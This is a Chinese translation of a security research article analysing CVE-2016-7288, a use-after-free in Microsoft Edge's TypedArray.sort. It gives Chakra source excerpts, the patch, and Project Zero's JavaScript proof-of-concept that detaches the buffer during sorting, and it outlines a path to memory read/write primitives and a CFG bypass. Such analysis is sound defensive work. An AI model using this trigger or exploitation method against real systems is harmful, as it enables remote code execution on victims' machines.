# 【漏洞分析】MS16-145：Edge浏览器TypedArray.sort UAF漏洞分析
|
##### 译文声明
本文是翻译文章，文章来源：quarkslab.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
翻译：[ **shan66**](http://bobao.360.cn/member/contribute?uid=2522399780)
**预估稿费：300RMB**
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**前言**
**在这篇文章中，我们将为读者详细分析如何利用MS Edge浏览器中的UAF漏洞来远程执行代码。**
本文将为读者深入分析影响MS Edge的CVE-2016-7288
UAF漏洞的根本原因，以及如何可靠地触发该UAF漏洞，如何用一种精确地方法来左右Quicksort从而控制交换操作并破坏内存，获得相对内存读/写原语，然后在WebGL的帮助下将其转换为绝对R
/ W原语，最后使用伪造的面向对象编程（COOP）技术来绕过控制流保护措施。
**分析注解**
本文是在Windows 10 Anniversary Update x64上使用下列版本的MS Edge执行分析工作的。
存在安全漏洞的模块：chakra.dll 11.0.14393.0
**简介**
Google Project Zero已经公布了此漏洞的概念证明[
**[3]**](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=257597)，据称这是一个影响JavaScript的TypedArray.sort方法的UAF漏洞。
下面是公布在Project Zero的bug跟踪器中的原始PoC：
值得注意的是，在我的测试过程中，这个PoC根本没有触发这个漏洞。
**该漏洞的根本原因**
根据Mozilla关于TypedArray.sort方法的文档[4]的介绍，“sort（）方法用于对类型化数组的元素进行排序，并返回类型化的数组”。这个方法有一个名为compareFunction的可选参数，该参数“指定定义排序顺序的函数”。
    JavaScript TypedArray.sort方法的对应的原生方法是chakra！TypedArrayBase :: EntrySort，它是在lib / Runtime / Library / TypedArray.cpp中定义的。
    Var TypedArrayBase::EntrySort(RecyclableObject* function, CallInfo callInfo, ...){
        [...]
        // Get the elements comparison function for the type of this TypedArray
        void* elementCompare = reinterpret_cast(typedArrayBase->GetCompareElementsFunction());
        // Cast compare to the correct function type
        int(__cdecl*elementCompareFunc)(void*, const void*, const void*) = (int(__cdecl*)(void*, const void*, const void*))elementCompare;
        void * contextToPass[] = { typedArrayBase, compareFn };
        // We can always call qsort_s with the same arguments. If user compareFn is non-null, the callback will use it to do the comparison.
        qsort_s(typedArrayBase->GetByteBuffer(), length, typedArrayBase->GetBytesPerElement(), elementCompareFunc, contextToPass);
我们可以看到，它调用GetCompareElementsFunction方法来获取元素比较函数，并且在进行类型转换后，所述函数将传递给qsort_s（）[5]作为其第四个参数。根据其文档：
qsort_s函数实现了一个快速排序算法来排序数组元素[…]。qsort_s会使用排序后的元素来覆盖这个数组。参数compare是指向用户提供的例程的指针，它比较两个数组元素并返回一个表明它们的关系的值。qsort_s在排序期间会调用一次或多次比较例程，每次调用时都会将指针传递给两个数组的元素。
这里描述的qsort_s所有细节，对我们的任务都是非常重要的，这一点将在后文章体现出来。
    GetCompareElementsFunction方法是在lib / Runtime / Library / TypedArray.h中定义的，它只是返回TypedArrayCompareElementsHelper函数的地址： 
    CompareElementsFunction GetCompareElementsFunction()
    {
        return &TypedArrayCompareElementsHelper;
    }
    本机比较函数TypedArrayCompareElementsHelper是在TypedArray.cpp中定义的，其代码如下所示： 
    template int __cdecl TypedArrayCompareElementsHelper(void* context, const void* elem1, const void* elem2)
    {
    [...]
        Var retVal = CALL_FUNCTION(compFn, CallInfo(CallFlags_Value, 3),
            undefined,
            JavascriptNumber::ToVarWithCheck((double)x, scriptContext),
            JavascriptNumber::ToVarWithCheck((double)y, scriptContext));
        Assert(TypedArrayBase::Is(contextArray[0]));
        if (TypedArrayBase::IsDetachedTypedArray(contextArray[0]))
        {
            JavascriptError::ThrowTypeError(scriptContext, JSERR_DetachedTypedArray, _u("[TypedArray].prototype.sort"));
        }
        if (TaggedInt::Is(retVal))
        {
            return TaggedInt::ToInt32(retVal);
        }
        if (JavascriptNumber::Is_NoTaggedIntCheck(retVal))
        {
            dblResult = JavascriptNumber::GetValue(retVal);
        }
        else
        {
            dblResult = JavascriptConversion::ToNumber_Full(retVal, scriptContext);
        }
CALL_FUNCTION宏将调用我们的JS比较函数。请注意，在调用我们的JS函数后，代码会检查用户控制的JS代码是否已经分离了类型化的数组。但是，如Natalie
Silvanovich所解释的那样，“函数的返回值被转换为一个可以调用valueOf的整数，如果这个函数分离了TypedArray，那么在释放缓冲区之后就会执行一个交换。在从TypedArrayCompareElementsHelper返回后，释放缓冲区中的元素交换操作发生在msvcrt！qsort_s中。
这个漏洞的修复程序只是在上面显示的代码之后对类型化数组的可能分离状态进行了额外的检查：
    // ToNumber may execute user-code which can cause the array to become detached
    if (TypedArrayBase::IsDetachedTypedArray(contextArray[0]))
    {
        JavascriptError::ThrowTypeError(scriptContext, JSERR_DetachedTypedArray, _u("[TypedArray].prototype.sort"));
    }
**Project Zero的概念证明**
Project
Zero提供的PoC看起来很简单：它创建了一个由ArrayBuffer对象支持的类型化数组（更具体地说是一个Uint8Array），它在类型化数组上调用sort方法，作为参数传递一个名为compareNumbers的JS函数。这个比较函数返回实现自定义valueOf方法的新对象：
    function compareNumbers(a, b) {
      alert("in func");
      return {valueOf : v};
    }
v是一个函数，它通过调用postMessage方法来将ArrayBuffer分解为类型化的数组对象。在尝试把比较函数的返回值转换为整数过程中，会在从TypedArrayCompareElementsHelper调用JavascriptConversion
:: ToNumber_Full（）时调用它。
    function v(){
      alert("in v");
      if( first == 0){
           postMessage("test", "http://127.0.0.1", [buf])
        first++;
        }
       return 7;
    }
这应该足以触发这个漏洞了。然而，在多次运行PoC之后，我很惊讶地发现，它并没有在存在该漏洞的机器上面造成任何崩溃。
**以可靠的方式触发漏洞**
过去，我编写过影响Internet
Explorer类似UAF漏洞的利用代码，这也涉及到将ArrayBuffer分解为类型化数组对象。根据我对IE的经验，当通过postMessage对ArrayBuffer进行排序时，会立即释放ArrayBuffer的原始内存，因此UAF漏洞的迹象是显而易见的。
在调试Edge内容进程一段时间之后，我意识到ArrayBuffer对象的原始内存没有被立即释放，而是在几秒之后，类似于“延迟释放”的方式。这导致该漏洞难以显示，因为qsort_s中的元素交换操作未触发未映射的内存。
通过查看Chakra JS引擎的源代码，可以看到使用ArrayBuffer时，在lib / Runtime / Library /
ArrayBuffer.cpp中的JavascriptArrayBuffer :: CreateDetachedState方法中创建了一个Js ::
ArrayBuffer :: ArrayBufferDetachedState对象。在“阉割”ArrayBuffer之后会立即出现这种情况。
    ArrayBufferDetachedStateBase* JavascriptArrayBuffer::CreateDetachedState(BYTE* buffer, uint32 bufferLength)
    {